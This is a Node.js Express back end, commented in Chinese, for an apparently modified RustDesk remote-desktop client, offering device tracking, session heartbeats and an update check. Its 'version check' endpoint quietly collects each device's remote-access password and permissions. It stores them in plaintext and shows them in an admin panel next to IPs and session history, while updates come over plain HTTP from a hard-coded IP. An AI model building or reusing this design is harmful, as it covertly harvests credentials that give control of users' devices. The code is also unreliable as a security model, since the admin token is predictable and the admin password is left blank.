// ═══════════════════════════════════════════════════════
// RustDesk 设备管理后台 + 版本检查 API
// 端口：3000
// ═══════════════════════════════════════════════════════

const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
app.use(express.json());

// ───────────────────────────────────────────────────────
// 配置
// ───────────────────────────────────────────────────────
const ADMIN_PASSWORD = '    '; // ← 改成你的密码
const SESSION_TOKEN = 'rustdesk-admin-session-' + Date.now();
const DATA_FILE = path.join(__dirname, 'devices.json');

// 心跳超时：超过此时间没有心跳视为会话已断开（毫秒）
const SESSION_TIMEOUT_MS = 90 * 1000; // 90秒

const VERSION_CONFIG = {
  android: {
    latestVersion: '1.8.0',
    minRequired: '1.4.5',
    forceUpdate: false,
    downloadUrl: 'http://112.74.59.152/download/rustdesk-latest.apk',
    updateLog: '1. 修复连接稳定性问题\n2. 优化画面传输质量',
    releaseUrl: 'http://112.74.59.152/releases/tag/1.8.0',
  },
};

// ───────────────────────────────────────────────────────
// 设备数据管理
// 格式：{
//   "device_id": {
//     id, firstSeen, lastSeen, ip, banned,
//     appVersion,          ← 客户端上报的软件版本
//     sessions: [          ← 远控会话记录
//       { sessionId, peerId, startTime, lastHeartbeat, ended, endTime }
//     ]
//   }
// }
// ───────────────────────────────────────────────────────
function loadDevices() {
  if (!fs.existsSync(DATA_FILE)) return {};
  try { return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); }
  catch { return {}; }
}

function saveDevices(devices) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(devices, null, 2));
}

function upsertDevice(deviceId, ip, appVersion, password, permissions) {
  const devices = loadDevices();
  const now = new Date().toISOString();
  if (!devices[deviceId]) {
    devices[deviceId] = {
      id: deviceId, firstSeen: now, lastSeen: now,
      ip, banned: false,
      appVersion: appVersion || null,
      password: password || null,
      permissions: permissions || {},
      sessions: [],
    };
  } else {
    devices[deviceId].lastSeen = now;
    devices[deviceId].ip = ip;
    if (appVersion) devices[deviceId].appVersion = appVersion;
    if (password) devices[deviceId].password = password;
    if (permissions && typeof permissions === 'object') devices[deviceId].permissions = permissions;
    if (!devices[deviceId].sessions) devices[deviceId].sessions = [];
    if (!devices[deviceId].permissions) devices[deviceId].permissions = {};
  }
  saveDevices(devices);
  return devices[deviceId];
}

// 判断设备是否正在远控（有活跃心跳的未结束会话）
function isRemoting(device) {
  if (!device.sessions?.length) return false;
  const now = Date.now();
  return device.sessions.some(s => {
    if (s.ended) return false;
    return now - new Date(s.lastHeartbeat || s.startTime).getTime() < SESSION_TIMEOUT_MS;
  });
}

function getActiveSessions(device) {
  if (!device.sessions?.length) return [];
  const now = Date.now();
  return device.sessions.filter(s => {
    if (s.ended) return false;
    return now - new Date(s.lastHeartbeat || s.startTime).getTime() < SESSION_TIMEOUT_MS;
  });
}

// ───────────────────────────────────────────────────────
// 管理员认证中间件
// ───────────────────────────────────────────────────────
function authMiddleware(req, res, next) {
  const token = req.headers['x-admin-token'];
  if (token !== SESSION_TOKEN) return res.status(401).json({ code: 401, msg: '未授权' });
  next();
}

// ───────────────────────────────────────────────────────
// 版本检查接口（APP 调用）
// POST /api/version/check
// Header: X-Device-Id
// Body:   { os, os_version, arch, app_version }   ← 新增 app_version
// ───────────────────────────────────────────────────────
app.post('/api/version/check', (req, res) => {
  const { os, os_version, arch, app_version, password, permissions } = req.body || {};
  const deviceId = req.headers['x-device-id'] || 'unknown';
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const device = upsertDevice(deviceId, ip, app_version, password, permissions);

  console.log(JSON.stringify({ time: new Date().toISOString(), deviceId, ip, os, os_version, arch, app_version }));

  if (device.banned) return res.json({ banned: true, msg: '设备已被禁用，请联系管理员' });

  const cfg = VERSION_CONFIG.android;
  return res.json({
    url: cfg.releaseUrl,
    latestVersion: cfg.latestVersion,
    minRequired: cfg.minRequired,
    forceUpdate: cfg.forceUpdate,
    downloadUrl: cfg.downloadUrl,
    updateLog: cfg.updateLog,
  });
});

// ───────────────────────────────────────────────────────
// 远控会话上报接口（APP 端调用）
//
// POST /api/session/start      开始被控
//   Header: X-Device-Id
//   Body:   { session_id, peer_id }
//
// POST /api/session/heartbeat  心跳保活（建议每 30 秒一次）
//   Header: X-Device-Id
//   Body:   { session_id }
//
// POST /api/session/end        结束被控
//   Header: X-Device-Id
//   Body:   { session_id }
// ───────────────────────────────────────────────────────
app.post('/api/session/start', (req, res) => {
  const { session_id, peer_id } = req.body || {};
  const deviceId = req.headers['x-device-id'] || 'unknown';
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  if (!session_id) return res.status(400).json({ code: 400, msg: '缺少 session_id' });

  // 确保设备存在
  upsertDevice(deviceId, ip);
  const devices = loadDevices();
  const device = devices[deviceId];
  const now = new Date().toISOString();

  if (!device.sessions.find(s => s.sessionId === session_id)) {
    device.sessions.push({
      sessionId: session_id,
      peerId: peer_id || null,
      startTime: now,
      lastHeartbeat: now,
      ended: false,
      endTime: null,
    });
    // 只保留最近 200 条历史
    if (device.sessions.length > 200) device.sessions = device.sessions.slice(-200);
    saveDevices(devices);
  }

  console.log(`[SESSION START] device=${deviceId} session=${session_id} peer=${peer_id}`);
  res.json({ code: 200, msg: 'ok' });
});

app.post('/api/session/heartbeat', (req, res) => {
  const { session_id } = req.body || {};
  const deviceId = req.headers['x-device-id'] || 'unknown';
  const devices = loadDevices();
  const device = devices[deviceId];
  if (!device) return res.status(404).json({ code: 404, msg: '设备不存在' });

  const s = device.sessions?.find(s => s.sessionId === session_id);
  if (s) { s.lastHeartbeat = new Date().toISOString(); saveDevices(devices); }
  res.json({ code: 200, msg: 'ok' });
});

app.post('/api/session/end', (req, res) => {
  const { session_id } = req.body || {};
  const deviceId = req.headers['x-device-id'] || 'unknown';
  const devices = loadDevices();
  const device = devices[deviceId];
  if (!device) return res.status(404).json({ code: 404, msg: '设备不存在' });

  const s = device.sessions?.find(s => s.sessionId === session_id);
  if (s) { s.ended = true; s.endTime = new Date().toISOString(); saveDevices(devices); }

  console.log(`[SESSION END] device=${deviceId} session=${session_id}`);
  res.json({ code: 200, msg: 'ok' });
});

// ───────────────────────────────────────────────────────
// 管理 API
// ───────────────────────────────────────────────────────
app.post('/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) return res.json({ code: 200, token: SESSION_TOKEN });
  return res.status(401).json({ code: 401, msg: '密码错误' });
});

// 获取设备列表（附带远控状态 & 版本信息）
app.get('/admin/devices', authMiddleware, (req, res) => {
  const devices = loadDevices();
  const list = Object.values(devices)
    .sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen))
    .map(d => ({
      ...d,
      remoting: isRemoting(d),
      activeSessions: getActiveSessions(d),
      sessions: (d.sessions || []).slice(-20), // 只返回最近 20 条历史
    }));
  res.json({ code: 200, data: list });
});

// 获取单个设备详情
app.get('/admin/devices/:id', authMiddleware, (req, res) => {
  const devices = loadDevices();
  const device = devices[req.params.id];
  if (!device) return res.status(404).json({ code: 404, msg: '设备不存在' });
  res.json({
    code: 200,
    data: {
      ...device,
      remoting: isRemoting(device),
      activeSessions: getActiveSessions(device),
    },
  });
});

app.post('/admin/devices/:id/ban', authMiddleware, (req, res) => {
  const devices = loadDevices();
  if (!devices[req.params.id]) return res.status(404).json({ code: 404, msg: '设备不存在' });
  devices[req.params.id].banned = true;
  saveDevices(devices);
  res.json({ code: 200, msg: '已禁用' });
});

app.post('/admin/devices/:id/unban', authMiddleware, (req, res) => {
  const devices = loadDevices();
  if (!devices[req.params.id]) return res.status(404).json({ code: 404, msg: '设备不存在' });
  devices[req.params.id].banned = false;
  saveDevices(devices);
  res.json({ code: 200, msg: '已恢复' });
});

app.delete('/admin/devices/:id', authMiddleware, (req, res) => {
  const devices = loadDevices();
  if (!devices[req.params.id]) return res.status(404).json({ code: 404, msg: '设备不存在' });
  delete devices[req.params.id];
  saveDevices(devices);
  res.json({ code: 200, msg: '已删除' });
});

app.get('/health', (_req, res) => res.json({ status: 'ok', time: new Date().toISOString() }));

app.get('/admin', (_req, res) => res.sendFile(path.join(__dirname, 'admin.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ 服务运行在 :${PORT}`);
  console.log(`   管理界面   : http://localhost:${PORT}/admin`);
  console.log(`   版本检查   : POST /api/version/check`);
  console.log(`   会话上报   : POST /api/session/start | heartbeat | end`);
});